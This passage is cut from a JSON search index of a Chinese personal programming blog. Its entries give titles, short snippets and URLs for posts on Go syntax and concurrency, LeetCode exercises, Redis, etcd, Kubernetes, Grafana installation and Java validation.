实现定时器","lvl1":null,"lvl2":"摘要","objectID":"016c3c327b0cbe8d30b1d6601db0832c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/golang-%E5%AE%9E%E7%8E%B0%E5%AE%9A%E6%97%B6%E5%99%A8/"},{"content":"给定单向链表的一个节点指针，定义一个函数在O(1)时间删除该结点。 假设链表一定存在，并且该节点一定不是尾节点。 样例 1 2 3 4 输入：链表 1-\u0026gt;4-\u0026gt;6-\u0026gt;8 删掉节","lvl0":"Golang 刷题入门 _o(1)时间删除链表节点","lvl1":null,"lvl2":"摘要","objectID":"f2536868fa42dc36b3dab67ac126ab64","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E9%93%BE%E8%A1%A8/o1%E6%97%B6%E9%97%B4%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8_go/"},{"content":"面试题 05.07. 配对交换 Difficulty: **配对交换。编写程序，交换某个整数的奇数位和偶数位，尽量使用较少的指令（也就是说，位0与位1交换，位2与位3交换，以此类","lvl0":"Golang 刷题入门 _配对交换","lvl1":null,"lvl2":"摘要","objectID":"6c9a4e78335b301b229eca254525f811","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E9%85%8D%E5%AF%B9%E4%BA%A4%E6%8D%A2/"},{"content":"剑指 Offer II 026. 重排链表 Difficulty: **给定一个单链表 L 的头节点 head ，单链表 L 表示为： L0 → L1 → … → Ln-1 → Ln 请将其重新排列后变为： L0 → Ln → L1 → Ln-1 → L2 → Ln-2 → … 不能只","lvl0":"Golang 刷题入门 _重排链表","lvl1":null,"lvl2":"摘要","objectID":"ece5bc8e7ea74388631ae79d374a6d4e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E9%93%BE%E8%A1%A8/%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/"},{"content":"给定一个字符串 aa，请你按照下面的要求输出字符串 bb。 给定字符串 aa 的第一个字符的 ASCII 值加第二个字符的 ASCII 值，得到 bb 的第一个字符； 给定字符串 aa 的第","lvl0":"Golang 刷题入门_输出字符串","lvl1":null,"lvl2":"摘要","objectID":"c9907bf54ec4af5ec1aa3ee172033712","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"输入一个二维数组 M[12][12]M[12][12]，根据输入的要求，求出二维数组的右下半部分元素的平均值或元素的和。 右下半部分是指次对角线","lvl0":"Golang 刷题入门_数组的右下半部分","lvl1":null,"lvl2":"摘要","objectID":"6218a57fa7d987f11916376470d121af","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E6%95%B0%E7%BB%84/%E6%95%B0%E7%BB%84%E7%9A%84%E5%8F%B3%E4%B8%8B%E5%8D%8A%E9%83%A8%E5%88%86/"},{"content":"给定一个由大小写字母构成的字符串。 把该字符串中特定的字符全部用字符 # 替换。 请你输出替换后的字符串。 输入格式 输入共两行。 第一行包含一个长度不超","lvl0":"Golang 刷题入门_替换字符串","lvl1":null,"lvl2":"摘要","objectID":"cf47f3ac145a8d00d587293c2322298f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E6%9B%BF%E6%8D%A2%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"content":"输入一行字符，长度不超过 100100，请你统计一下其中的数字字符的个数。 输入格式 输入一行字符。注意其中可能包含空格。 输出格式 输出一个整数，表","lvl0":"Golang 刷题入门_字符串中数字的个数","lvl1":null,"lvl2":"摘要","objectID":"81d93314af3354f80835cdf4dd2531ea","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8/%E5%AD%97%E7%AC%A6%E4%B8%B2/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E6%95%B0%E5%AD%97%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"content":"golang 项目打包脚本 1 2 3 4 5 set GOARCH=amd64 set GOOS=linux go build -tags=jsoniter main.go 上传服务器 1 2 3 4 scp ./main myBlog:/root/spider_APP/ scp -r static myBlog:/root/spider_APP/ ssh myBlog docker镜像版 1 2 3 4 5 6 7 set GOARCH=amd64 set GOOS=linux :: 打包 main文件 go build .\\cmd\\cmdb\\main.go","lvl0":"golang 项目打包脚本","lvl1":null,"lvl2":"摘要","objectID":"820322e1f0341b4513644d116e809e4f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E8%84%9A%E6%9C%AC/"},{"content":"golang 早期调度的实现原理 老调度器的几个缺点： 创建、销毁、调度 goroutine 都需要每个 M获取锁， 这就形成了激烈的锁竞争。 M 转移 G 会造成延迟和额外的系统负载 系统","lvl0":"golang 早期调度器的实现原理","lvl1":null,"lvl2":"摘要","objectID":"934bb502be2e3a3a18987f1fee432478","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%85%AB%E8%82%A1%E6%96%87/%E6%97%A9%E6%9C%9Fgo%E8%AF%AD%E8%A8%80%E8%B0%83%E5%BA%A6%E5%8E%9F%E7%90%86/"},{"content":"elastic search 框架使用 golang 的项目参考 Java 的项目参考","lvl0":"Golang_elasticsearch","lvl1":null,"lvl2":"摘要","objectID":"1a791c3d923f936ca6cad9b05db77509","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/elasticsearch/"},{"content":"什么是 etcd etcd 应该和zookeeper 类型 参考知乎的说法 zookeeper zookeeper watches 用户可以对一个 ZNode 设置 watch，当这个 ZNode 发生了变化时，例如 创建、删除、数据变更、添","lvl0":"Golang_etcd 了解","lvl1":null,"lvl2":"摘要","objectID":"123b7ed18850635390ad42294615a38f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/etcd/"},{"content":"channel 创建 channel 1 msg := make(chan int, 10) 基于 channel的通信是同步的 当缓冲区满时，数据发送是阻塞的 通过 make 关键字创建通道时候可以定义缓冲区容量，默认缓冲区容量","lvl0":"Golang_多线程","lvl1":null,"lvl2":"摘要","objectID":"81ce728326f1dc5074941ee834c1be58","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/golang%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"content":"锁 sync.Mutex 互斥锁 lock 加锁，unlock解锁 sync.RWMutex 读写锁 不限制并发读，但是会阻塞 读 和写的同时发生 sync.WaitGroup 【读写分离，为了优化性能】 等待 一组 goroutine 返回 sync.Once 保证某段代码只","lvl0":"Golang_进阶语法","lvl1":null,"lvl2":"摘要","objectID":"99617d00610168b5227c74c12c179b01","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/go%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6%E8%AF%AD%E6%B3%95/"},{"content":"golang 异常处理总结 参考博客 参考 知乎的博客 1. switch case 处理 return的 问题 2. goto 处理golang return 太多 如何解决 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21","lvl0":"Golang_如何解决 异常","lvl1":null,"lvl2":"摘要","objectID":"620c87812ebfef1475156b6ce57a4782","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/golang%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3return/"},{"content":"golang 项目分层 一个基本的go项目一般会有cmd, internal, pkg三个基础目录来分层，当然这不是官方go核心开发团队定义的标准。但这个确实是目前go生态系","lvl0":"Golang_项目分层","lvl1":null,"lvl2":"摘要","objectID":"3199024d53905bc07c0356609568cefe","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%AE%9E%E4%B9%A0%E5%AD%A6%E4%B9%A0/golang%E9%A1%B9%E7%9B%AE%E5%88%92%E5%88%86_%E5%A6%82%E4%BD%95%E5%88%86%E5%8C%85/"},{"content":"if 条件语句 1 2 3 4 5 6 7 8 9 10 11 12 13 if condition1 { } else if condition2 { }else { } // if 的简短语句 // 同 for 一样， if 语句可以在白条鸡表达式前面执行一个简单的语句 if v:= x-100; v\u0026lt;0 {","lvl0":"Golang_语言的基础语法","lvl1":null,"lvl2":"摘要","objectID":"f9ca3bee0099f254e6c18708dc5b6144","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"content":"为什么需要 go语言 其他语言的弊端 硬件发展速度远远超过软件 c语言等原生语言 缺乏好的依赖管理【依赖于头文件】 java 和 c++ 等语言过于笨重 系统语言对垃圾回","lvl0":"Golang_语言的特性","lvl1":null,"lvl2":"摘要","objectID":"6af6166c1fab98059c185c8625f05afa","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/go%E8%AF%AD%E8%A8%80%E7%9A%84%E7%89%B9%E6%80%A7/"},{"content":"golang操作redis 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57","lvl0":"golang操作redis","lvl1":null,"lvl2":"摘要","objectID":"6763b5ab7b416db8788eaa7d9b3b0cf1","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/redis/golang%E6%93%8D%E4%BD%9Credis/"},{"content":"golang GMP模型 学习教程, 看11分钟 一个进程 可以有多个线程 ，每个线程 有多个协程 协程和线程的关系 N：M原理 一个协程可以挂到不同的线程上面去，所以是","lvl0":"golang的 GMP模型","lvl1":null,"lvl2":"摘要","objectID":"2ac9e48a71f6f2c5c0da3fc2c40dce1e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E5%85%AB%E8%82%A1%E6%96%87/golang%E7%9A%84-gmp%E6%A8%A1%E5%9E%8B/"},{"content":"golang 动态执行脚本 golang 需要编译，但是 有时候我需要动态语言的特性，就需要动态执行脚本 更多 gopher-luar 和 starlark-go-lib 已经把在 gopher-lua 和 starlark-go 中使用 go 语言的第三方包变得极其容易。当然","lvl0":"Golang动态执行脚本","lvl1":null,"lvl2":"摘要","objectID":"330ac2a951dd9dbc4e1224b702a8ef31","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%AA%9A%E6%93%8D%E4%BD%9C/%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC/"},{"content":"golang基础语法 golang 自带的标识符 golang 除了保留关键字，还提供 36个预定义标识符，包括基础数据类型， 系统内嵌函数等。 golang 编程基本规则 变量名首字母大","lvl0":"golang基础语法","lvl1":null,"lvl2":"摘要","objectID":"bc8a1325f55d2e02522c15594e336272","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/golang%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"content":"switch 语句的骚操作 switch switch 是编写一连串 if - else 语句的简便方法。它运行第一个值等于条件表达式的 case 语句。 Go 的 switch 语句类似于 C、C++、Java、JavaSc","lvl0":"golang流程控制语法","lvl1":null,"lvl2":"摘要","objectID":"119ac311bfc85addbdf6f18945686a64","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/golang-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/"},{"content":"golang爬取网页乱码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58","lvl0":"GOLANG爬取网页乱码","lvl1":null,"lvl2":"摘要","objectID":"c098f784855f75b895bbf76b73a81e27","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E9%A1%B9%E7%9B%AE%E5%B8%B8%E7%94%A8/golang-%E7%88%AC%E8%99%AB%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"content":"server example 1 2 ncat 127.0.0.1 8080 # 这边可以输入消息，然后server可以打印 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41","lvl0":"golang网络编程入门_server_example","lvl1":null,"lvl2":"摘要","objectID":"35a719f0d74770ddd29b20ec1f6f7d9d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/server_example/"},{"content":"golang 语言依赖管理 通过环境变量，直接 去GOPATH 去找 不同版本可能会存在 不兼容，因此 会比较麻烦 代码 clone 以后需要设置 GOPATH 才能编译 vendor 自 1.6 版本，支持ven","lvl0":"golang项目依赖管理","lvl1":null,"lvl2":"摘要","objectID":"97f81becfa209ad0fa7bdc2c2db5b702","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/golang%E9%A1%B9%E7%9B%AE%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86/"},{"content":"go语言常用的内置函数 complex close copy panic recover print cap delete new 格式化输出 %v 只输出所有的值 %+v 先输出字段名字，再输出该字段的值 %#v 先输出结构体名字值，再输出结构体（字段","lvl0":"go语言内置函数","lvl1":null,"lvl2":"摘要","objectID":"7f9483c6a32a6003994d08027106be39","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/buildin-%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0/"},{"content":"grafana安装 1 2 3 4 5 6 7 # 安装 yum install grafana -y systemctl enable grafana-server systemctl start grafana-server # 开启 grafana-server systemctl restart grafana-server 安装 clickhouse 插件 1 grafana-cli plugins install grafana-clickhouse-datasource grafana 修改我的主题为白色 进入 那个 preference 界面 explore","lvl0":"grafana安装","lvl1":null,"lvl2":"摘要","objectID":"06b757adbf329396a8eeee9bb9cc4760","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/grafana/grafana%E5%AE%89%E8%A3%85/"},{"content":"hibernate validator切面校验 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package io.github.lyr2000.dissertation.enums; /** * 用于 hibernate 分组校验 * @author lyr * @description validator * @create 2021-11-21 15:22 */ public final class V { /** * 全量更新","lvl0":"hibernate validator 切面校验","lvl1":null,"lvl2":"摘要","objectID":"58f6f5740bd2429ca1b620b7d0e71744","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springboot/hibernate-validator%E5%88%87%E9%9D%A2%E6%A0%A1%E9%AA%8C/"},{"content":"hibernate validator 使用方法 JSR-303 Bean validation 是一个规范， 提供了大量的注解接口等。 validated 和 valid 的区别 @Valid：没有分组的功能。 @Valid：可以用在方法、构造函数、方法参","lvl0":"hibernate validator框架的使用","lvl1":null,"lvl2":"摘要","objectID":"b3242609993269fa3f25bb5e91cc17bf","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/validator/validator%E6%A1%86%E6%9E%B6/"},{"content":"本文由网络文章整理备份。 iterm2 rz与sz的功能 本文主要介绍mac环境下使用iterm2的rz sz功能的安装流程。 1. 安装lrzsz 1 brew install lrzsz 2. 安装执","lvl0":"iterm2-rzsz","lvl1":null,"lvl2":"摘要","objectID":"ec5dda4b7982f7df05ef587556aea56a","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/keymap/iterm2-rzsz/"},{"content":"正则表达式使用 正则表达式经常用，这里介绍个网站 正则表达式生成器 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package io.github.lyr2000.dissertation.util; import java.util.regex.Matcher; import java.util.regex.Pattern; /** * @author lyr * @description 字符串比较工","lvl0":"Java 正则表达式","lvl1":null,"lvl2":"摘要","objectID":"fa609b30ca8366aea9328e76ea39f63b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/idea%E5%B7%A5%E5%85%B7/java-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"content":"269个js 工具，记录","lvl0":"javascript 工具记录","lvl1":null,"lvl2":"摘要","objectID":"140615df506617cac0144446beb2867b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java-script%E5%AD%A6%E4%B9%A0/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/"},{"content":"JWT token适配 参考视频","lvl0":"JWT token 视频方法","lvl1":null,"lvl2":"摘要","objectID":"f6590a79da96174fbb636b0567236fc2","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/jwt-token-%E9%80%82%E9%85%8D%E6%96%B9%E6%B3%95/"},{"content":"K8S环境搭建 k8s部署方式 Minikube 单点微型K8S 二进制安装， k8s文档 web命令行学习版本 点击 launch terminal 开启 kubectl 使用 参考博客 将 config 放到 ~/.kube 目录下 , 然后 就可以","lvl0":"K8S环境搭建","lvl1":["k8s"],"lvl2":"摘要","objectID":"faabc5e759d3d04123f7983452f925dd","tags":["k8s"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/k8s/k8s%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"content":"kubectl 工具使用 安装 windows工具 1 2 kubectl get node kubectl get nodes k8snode1","lvl0":"kubectl工具使用","lvl1":null,"lvl2":"摘要","objectID":"7a707e0ac376282b9bd3c2a98f79a7d5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF/kubectl%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"content":"lc.002.二进制加法 剑指 Offer II 002. 二进制加法 Difficulty: **给定两个 01 字符串 a 和 b ，请计算它们的和，并以二进制字符串的形式输出。 输入为 非空 字符串且只包","lvl0":"lc.002.二进制加法","lvl1":null,"lvl2":"摘要","objectID":"11fc0358f5331d958f815290853a171c","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E5%AD%A6/%E6%A8%A1%E6%8B%9F/lc.002.%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E6%B3%95/"},{"content":"剑指 Offer II 081. 允许重复选择元素的组合 Difficulty: **给定一个无重复元素的正整数数组 candidates 和一个正整数 target ，找出 candidates 中所有可以使数字和为目标数 target 的唯一组合。 candidates 中的数","lvl0":"lc.081.允许重复选择元素的组合","lvl1":null,"lvl2":"摘要","objectID":"c9a644f2ea5a4d61f89fa519f46f3f85","tags":["算法学习","dfs"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/lc.%E5%85%81%E8%AE%B8%E9%87%8D%E5%A4%8D%E9%80%89%E6%8B%A9%E5%85%83%E7%B4%A0%E7%9A%84%E7%BB%84%E5%90%88/"},{"content":"10.10.数据流的秩 面试题 10.10. 数字流的秩 Difficulty: **假设你正在读取一串整数。每隔一段时间，你希望能找出数字 x 的秩(小于或等于 x 的值的个数)。请实现","lvl0":"lc.10.10.数据流的秩【树状数组】","lvl1":null,"lvl2":"摘要","objectID":"79440e05b56137200b7a2d84381d9245","tags":["算法学习","树状数组"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/lc.10.10.%E6%95%B0%E5%AD%97%E6%B5%81%E7%9A%84%E7%A7%A9/"},{"content":"1005. K 次取反后最大化的数组和 Difficulty: **给你一个整数数组 nums 和一个整数 k ，按以下方法修改该数组： 选择某个下标 i 并将 nums[i] 替换为 -nums[i] 。 重复这个过程恰好 k 次。可","lvl0":"lc.1005.k次取反后最大化的数组和","lvl1":null,"lvl2":"摘要","objectID":"941e4aa906fa9ceb82ba184e30ec13b5","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/%E8%B4%AA%E5%BF%83/lc.k%E6%AC%A1%E5%8F%96%E5%8F%8D%E5%90%8E%E6%9C%80%E5%A4%A7%E5%8C%96%E7%9A%84%E6%95%B0%E7%BB%84%E5%92%8C/"},{"content":"1035. 不相交的线 Difficulty: 